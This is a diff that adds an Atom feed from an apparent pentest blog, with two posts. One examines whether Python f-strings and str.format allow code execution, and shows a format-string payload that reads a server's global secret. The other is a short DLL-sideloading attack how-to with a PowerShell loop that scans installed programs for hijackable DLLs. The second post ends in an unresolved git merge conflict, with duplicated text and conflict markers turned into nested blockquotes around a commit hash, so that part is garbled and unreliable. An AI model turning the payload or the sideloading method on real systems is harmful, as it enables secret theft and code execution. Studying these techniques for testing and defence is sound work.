@@ -1,0 +1,375 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>gbaru's blog</title><link href="https://blog.riskreduction.net/" rel="alternate"></link><link href="https://blog.riskreduction.net/feeds/all.atom.xml" rel="self"></link><id>https://blog.riskreduction.net/</id><updated>2023-06-15T22:00:00+02:00</updated><entry><title>Understanding Python f-Strings for RCE, Part 1</title><link href="https://blog.riskreduction.net/understanding-python-f-strings-for-rce-part-1.html" rel="alternate"></link><published>2023-06-15T22:00:00+02:00</published><updated>2023-06-15T22:00:00+02:00</updated><author><name>gbaru</name></author><id>tag:blog.riskreduction.net,2023-06-15:/understanding-python-f-strings-for-rce-part-1.html</id><summary type="html">&lt;h2&gt;What are Python f-Strings&lt;/h2&gt;
+&lt;p&gt;Python f-strings, short for "formatted string literals," are a convenient way to embed expressions inside string literals, allowing for easy string interpolation. F-strings were introduced in Python 3.6 and provide a concise and readable syntax for creating formatted strings.&lt;/p&gt;
+&lt;p&gt;To create an f-string, you prefix …&lt;/p&gt;</summary><content type="html">&lt;h2&gt;What are Python f-Strings&lt;/h2&gt;
+&lt;p&gt;Python f-strings, short for "formatted string literals," are a convenient way to embed expressions inside string literals, allowing for easy string interpolation. F-strings were introduced in Python 3.6 and provide a concise and readable syntax for creating formatted strings.&lt;/p&gt;
+&lt;p&gt;To create an f-string, you prefix the string literal with the letter "f" or "F" and enclose expressions inside curly braces {}. The expressions inside the curly braces are evaluated at runtime and their values are inserted into the resulting string. Here's an example:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Alice&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;age&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;
+
+&lt;span class="c1"&gt;# Using f-string to create a formatted string&lt;/span&gt;
+&lt;span class="n"&gt;message&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;My name is &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; and I&amp;#39;m &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; years old.&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Why write about it?&lt;/h2&gt;
+&lt;p&gt;Well, every now and then, we come across these functions in source code and discuss whether they pose a risk for Remote Code Execution (RCE) or not. There are links on the internet &lt;a href="https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/"&gt;1&lt;/a&gt;, &lt;a href="https://github.com/adeptex/CTF/blob/master/fstring-injection.md"&gt;2&lt;/a&gt;, and others that claim exploitability, while &lt;a href="https://security.stackexchange.com/questions/238338/are-there-any-security-concerns-to-using-python-f-strings-with-user-input"&gt;others&lt;/a&gt; demonstrate that it is often not the case.&lt;/p&gt;
+&lt;h2&gt;Example Code&lt;/h2&gt;
+&lt;p&gt;So lets review some snippets to see about the confusions.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;This is executed: &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1234&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="Result" src="./images/executed.png"&gt;&lt;/p&gt;
+&lt;p&gt;and&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;print(1234)&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;This is not: &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="Execure and Not" src="./images/execudandnot.png"&gt;&lt;/p&gt;
+&lt;p&gt;This might look very close to each other, but it seems python sees differences in it.
+Before going on, we need to understand differences, before trying more techniques.&lt;/p&gt;
+&lt;h2&gt;Python under the Hood&lt;/h2&gt;
+&lt;p&gt;To display the bytecode (disassembly) of a function in Python, you can utilize the dis module. The dis module offers a disassembler for Python bytecode, enabling you to examine the low-level instructions executed by the Python interpreter.&lt;/p&gt;
+&lt;p&gt;Lets do this for a new-style f-string:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="dis execution" src="./images/disone.png"&gt;&lt;/p&gt;
+&lt;p&gt;What we can see here is that test0 is not a string constant, but being evaluated at runtime. Now this sounds like an eval() code, but lets do some tests to show you that its not so easy:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;dis&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test1&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
+    &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1234&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;This is executed: &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test2&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
+    &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;print(1234)&amp;quot;&lt;/span&gt;
+    &lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;This is not: &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+
+&lt;span class="n"&gt;dis&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dis&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;test1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;test1&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;----- between -----&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;dis&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dis&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;test2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;test2&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="dis execution" src="././images/disexec3.png"&gt;&lt;/p&gt;
+&lt;p&gt;In test one, we can observe that the print statement is executed, but it's important not to be misled. The execution of the print statement occurs during the variable declaration line. The value stored in tmp is None, and therefore our execution evaluation is performed on nothing (since it has already been executed).&lt;/p&gt;
+&lt;p&gt;In the second example, tmp is merely being formatted, and no function call occurs.&lt;/p&gt;
+&lt;p&gt;If we desire a mechanism to execute code from something like f"Exec {user_input}", we need a way to provide something that is not solely interpreted as a string (LOAD CONST).&lt;/p&gt;
+&lt;h3&gt;Further tests&lt;/h3&gt;
+&lt;p&gt;We need to assign something to a variable that is interpreted as a function or something that triggers the execution of hidden code. I can envision two approaches to achieve this: using a lambda function or using a class.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1234&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;This is not: &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1234&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;This is : &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="lambda exec" src="././images/lambda2.png"&gt;&lt;/p&gt;
+&lt;p&gt;So we are not abe to place something executeable into an variable with this directly. But we can define a function call... no we cannot. The call is not part of the string evaluation, as we have seen in the beginning.&lt;/p&gt;
+&lt;p&gt;With a class, we can try something, but it is clear that instantiation leads to to same problems as before.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MyClass&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;message&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Hello, World!&amp;quot;&lt;/span&gt;
+
+&lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MyClass&lt;/span&gt; 
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;This is : &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;This is : &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Exploitable Case&lt;/h2&gt;
+&lt;p&gt;Just like &lt;a href="https://security.stackexchange.com/questions/238338/are-there-any-security-concerns-to-using-python-f-strings-with-user-input"&gt;here&lt;/a&gt; it is possible to exploit, but where is the difference in that example?&lt;/p&gt;
+&lt;p&gt;The example:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;http.server&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;HTTPServer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;BaseHTTPRequestHandler&lt;/span&gt;
+
+&lt;span class="n"&gt;secret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;abc123&amp;#39;&lt;/span&gt;
+
+&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Handler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BaseHTTPRequestHandler&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;funtimes&amp;#39;&lt;/span&gt;
+    &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;welcome to &lt;/span&gt;&lt;span class="si"&gt;{site.name}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;do_GET&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="n"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;lt;title&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;site&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send_header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;content-type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;text/html&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;end_headers&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;wfile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;res&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
+
+&lt;span class="n"&gt;HTTPServer&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8888&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;Handler&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;serve_forever&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The difference is that the attacker actually controls the string that is going to be formatted.
+So this line:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;lt;title&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;site&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;will be made into something we directly control, in the example to&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;lt;title&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;XXX&lt;/span&gt;&lt;span class="si"&gt;{site.do_GET.__globals__[secret]}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;site&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;From the provided example, people have been discussing whether the vulnerability could lead to Remote Code Execution (RCE). Let's examine what we can observe.&lt;/p&gt;
+&lt;p&gt;We have control over the left part of the code, but it is being formatted based on the condition set in the right part. The code expects and will not execute without exactly one pair of {}. It intends to format the site variable with the value of self. Consequently, the code will load 'self' into 'site' and then evaluate the code.&lt;/p&gt;
+&lt;p&gt;In the case of this code, this grants us full control over the Handler instance, and based on the provided solution, it is already established that accessing members is possible.&lt;/p&gt;
+&lt;p&gt;Python possesses numerous magical functionalities, but we will explore them in a subsequent post.&lt;/p&gt;
+&lt;h2&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;It appears that there are specific cases in which formatting can lead to exploitable evaluation. Therefore, it is reasonable to consider the following approach: If the user input is parsed or manipulated only once, it is likely safe. However, if there are two or more manipulations, it might create the necessary side-effect.&lt;/p&gt;
+&lt;p&gt;Even in scenarios where a side-effect is present, it remains uncertain whether it is sufficient for a complete Remote Code Execution (RCE). As a result, further exploration and investigation will be conducted in part 2 to gain more insights.&lt;/p&gt;</content><category term="Pentest"></category><category term="Python"></category><category term="Eval"></category><category term="f-Strings"></category></entry><entry><title>DLL-Sideloading Attack: A Fast How-To</title><link href="https://blog.riskreduction.net/dll-sideloading-attack-a-fast-how-to.html" rel="alternate"></link><published>2023-06-09T22:00:00+02:00</published><updated>2023-06-09T22:00:00+02:00</updated><author><name>gbaru</name></author><id>tag:blog.riskreduction.net,2023-06-09:/dll-sideloading-attack-a-fast-how-to.html</id><summary type="html">&lt;h2&gt;What is DLL-Sideloading&lt;/h2&gt;
+&lt;p&gt;In this guide, we will provide a quick overview of a DLL-sideloading attack and demonstrate how it can be executed.
+Dynamic link libraries (DLLs) are loaded by the operating system (OS) when an application starts. There are two main methods of loading DLLs, and we focus on …&lt;/p&gt;</summary><content type="html">&lt;h2&gt;What is DLL-Sideloading&lt;/h2&gt;
+&lt;p&gt;In this guide, we will provide a quick overview of a DLL-sideloading attack and demonstrate how it can be executed.
+Dynamic link libraries (DLLs) are loaded by the operating system (OS) when an application starts. There are two main methods of loading DLLs, and we focus on those that are specified only by name and not by an absolute path.&lt;/p&gt;
+&lt;p&gt;DLLs without a specified path are searched by the OS. The OS has a defined search order, which can vary depending on certain settings such as Safe-DLL. To determine the specific search order for your system, you can conduct a search or refer to relevant documentation.&lt;/p&gt;
+&lt;h2&gt;The Attack&lt;/h2&gt;
+&lt;p&gt;If we can successfully place our own loaded DLL in a directory that is part of the search order and is positioned earlier than the original file, our DLL will be loaded along with the program. It is crucial to note that we must have write access to the directory in order to accomplish this.&lt;/p&gt;
+&lt;h2&gt;Tools&lt;/h2&gt;
+&lt;h3&gt;siofra&lt;/h3&gt;
+&lt;p&gt;There is a tool that is able to search for these kinds of vulnerabilities I like:
+It is &lt;a href="https://github.com/Cybereason/siofra"&gt;siofra&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Consider the following powershell script from &lt;a href="https://twitter.com/ShitSecure/status/1566126264469098497/photo/1"&gt;here&lt;/a&gt;. For 32-bit exchange the Siofra.exe&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;Get-ChildItem&lt;/span&gt; &lt;span class="n"&gt;-Path&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C:\Program Files\&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;-Filter&lt;/span&gt; &lt;span class="p"&gt;*.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt; &lt;span class="n"&gt;-Recurse&lt;/span&gt; &lt;span class="o"&gt;-File&lt;/span&gt; &lt;span class="n"&gt;-Name&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="k"&gt;ForEach&lt;/span&gt;&lt;span class="n"&gt;-Object&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;mkdir&lt;/span&gt; &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:\&lt;/span&gt;&lt;span class="n"&gt;temp&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;hijacktest&lt;/span&gt;
+    &lt;span class="nv"&gt;$binarytoCheck&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C:\Program Files\&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$_&lt;/span&gt;
+    &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:\&lt;/span&gt;&lt;span class="n"&gt;Tools&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;siofra&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Siofra64&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-mode&lt;/span&gt; &lt;span class="n"&gt;file-scan&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-enum-dependency&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-dll-hijack&lt;/span&gt; &lt;span class="o"&gt;-f&lt;/span&gt; &lt;span class="nv"&gt;$binarytoCheck&lt;/span&gt; &lt;span class="p"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:\&lt;/span&gt;&lt;span class="n"&gt;temp&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;hijacktest&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;toCheck&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; HEAD
+Generally the output can be considered in two parts, the binary analysis shows which dlls might be attackable with an exlamation mark:
+=======
+Generally the output can be considered in two parts, the binary analysis shows which DLLs might be attackable with an exlamation mark:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ffb806d5d60bcee6825dda9c7472b68de6a260cc&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
